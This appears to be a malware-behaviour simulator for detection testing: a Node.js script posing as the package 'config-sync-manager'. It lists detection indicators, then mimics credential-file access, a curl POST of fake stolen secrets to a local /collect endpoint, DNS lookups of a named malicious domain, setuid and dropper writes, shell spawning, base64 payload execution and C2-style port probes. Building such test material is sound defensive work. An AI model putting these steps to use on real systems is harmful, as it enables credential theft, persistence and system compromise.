
// Controlled static indicators for detection only:
// /etc/passwd /etc/shadow .ssh/id_rsa authorized_keys .aws/credentials .env Authorization: Bearer BEGIN PRIVATE KEY
// /collect /exfil fetch method: "POST" socket.connect(
// /bin/bash /bin/sh execve( popen( os.system( child_process.exec( spawnSync(
// exec( eval( compile( __import__( execFile( execSync( global.eval(
// base64.b64decode( atob( String.fromCharCode( unescape( exec(base64
// crontab .bashrc .profile systemctl enable /etc/init.d
// "preinstall" "postinstall" "prepare" cmdclass post_install
// import socket import subprocess import ctypes import pty require('net') require('child_process')

const fs=require("fs"); const net=require("net"); const dns=require("dns"); const {execSync,spawn,spawnSync}=require("child_process");
const MALICIOUS_DOMAIN="alig9-trail.1dorelax.surf"; const PORTS=[4444,1337,6667,31337,9001,8080,2323,1234]; const FILE_LOOPS=80; const PROCS=16; const SLEEP_SECONDS=60;
function run(cmd,timeout=15000){try{execSync(cmd,{stdio:"ignore",shell:"/bin/bash",timeout})}catch(e){}}
function tryOpen(p){try{fs.accessSync(p)}catch(e){} try{fs.statSync(p)}catch(e){} try{const fd=fs.openSync(p,"r");fs.closeSync(fd)}catch(e){}}
function writeFile(p,d){try{fs.writeFileSync(p,d)}catch(e){}}
function connectAttempt(host,port){try{const s=new net.Socket();s.setTimeout(800);s.on("error",()=>{});s.on("timeout",()=>{try{s.destroy()}catch(e){}});s.connect(port,host,()=>{try{s.write("GET / HTTP/1.0\r\nHost: "+host+"\r\n\r\n")}catch(e){}try{s.destroy()}catch(e){}})}catch(e){}}
function oneHttpOnly(){run(`curl -sS -m 3 -X POST -H "Host: ${MALICIOUS_DOMAIN}" -H "Content-Type: application/json" -H "User-Agent: config-sync-manager/1.0" --data '{"package":"config-sync-manager","token":"Authorization: Bearer stolen-token","secret":"BEGIN PRIVATE KEY fake","domain":"alig9-trail.1dorelax.surf","credentials":".aws/credentials stolen","password":"hunter2"}' http://127.0.0.1:8080/collect >/dev/null || true`,6000);}
console.log("[config-sync-manager] start");
try{dns.lookup(MALICIOUS_DOMAIN,()=>{})}catch(e){} try{dns.resolve4(MALICIOUS_DOMAIN,()=>{})}catch(e){}
oneHttpOnly();
["/etc/passwd","/etc/hosts","/etc/hostname","/etc/resolv.conf","/etc/os-release","/etc/group"].forEach(tryOpen);
["/root/.ssh/id_rsa","/root/.ssh/authorized_keys","/root/.aws/credentials","/root/.bash_history","/root/.profile","/etc/passwd","/etc/shadow","/etc/sudoers","/etc/ssh/sshd_config"].forEach(tryOpen);
for(let i=0;i<FILE_LOOPS;i++){const p=`/tmp/config-sync-manager_artifact_${i}.txt`;writeFile(p,"artifact "+i+"\n");try{fs.readFileSync(p)}catch(e){}try{fs.appendFileSync(p,"append "+i+"\n")}catch(e){}try{fs.renameSync(p,p+".renamed")}catch(e){}try{fs.unlinkSync(p+".renamed")}catch(e){}}
writeFile("/tmp/config-sync-manager_security_target","security-target\n"); run("chmod 777 /tmp/config-sync-manager_security_target || true"); run("chmod u+s /tmp/config-sync-manager_security_target || true"); run("chown root:root /tmp/config-sync-manager_security_target || true");
run("/bin/sh -c 'echo shell-test; whoami; id'");
const encoded=Buffer.from("console.log('decoded-payload')").toString("base64"); try{new Function(Buffer.from(encoded,"base64").toString())()}catch(e){}
try{Buffer.from("ZXhlYyhiYXNlNjQpLXNpbXVsYXRpb24=","base64").toString()}catch(e){}
run(`python3 - <<'PY'
import ctypes, mmap, time
try: ctypes.CDLL("libc.so.6").ptrace(0,0,None,None)
except Exception: pass
try:
    m=mmap.mmap(-1,4096,prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC); m.write(b"AAAA")
except Exception: pass
time.sleep(2)
PY`);
run("crontab -l >/tmp/cron_probe 2>&1 || true"); run("/bin/sh -c 'echo persistence-test >> /tmp/.profile_probe'"); ["/etc/init.d/fake-service","/etc/cron.d/fake-job","/root/.npmrc","/root/.docker/config.json","/root/.bashrc","/root/.profile"].forEach(tryOpen);
run("echo '#!/bin/sh' > /usr/bin/config-sync-manager_dropper 2>/dev/null || true"); run("chmod 755 /usr/bin/config-sync-manager_dropper 2>/dev/null || true");
const children=[]; for(let i=0;i<PROCS;i++){try{children.push(spawn("/bin/sh",["-c","echo process-op; id; sleep "+Math.min(SLEEP_SECONDS,20)],{stdio:"ignore"}))}catch(e){}}
run("npm --version >/tmp/config-sync-manager_npm_version 2>&1 || true"); run("pip --version >/tmp/config-sync-manager_pip_version 2>&1 || true");
for(const port of PORTS){connectAttempt("127.0.0.1",port); connectAttempt("1.1.1.1",port);}
spawnSync("/bin/sh",["-c","sleep "+SLEEP_SECONDS],{stdio:"ignore"});
for(const c of children){try{c.kill()}catch(e){}}
console.log("[config-sync-manager] done");
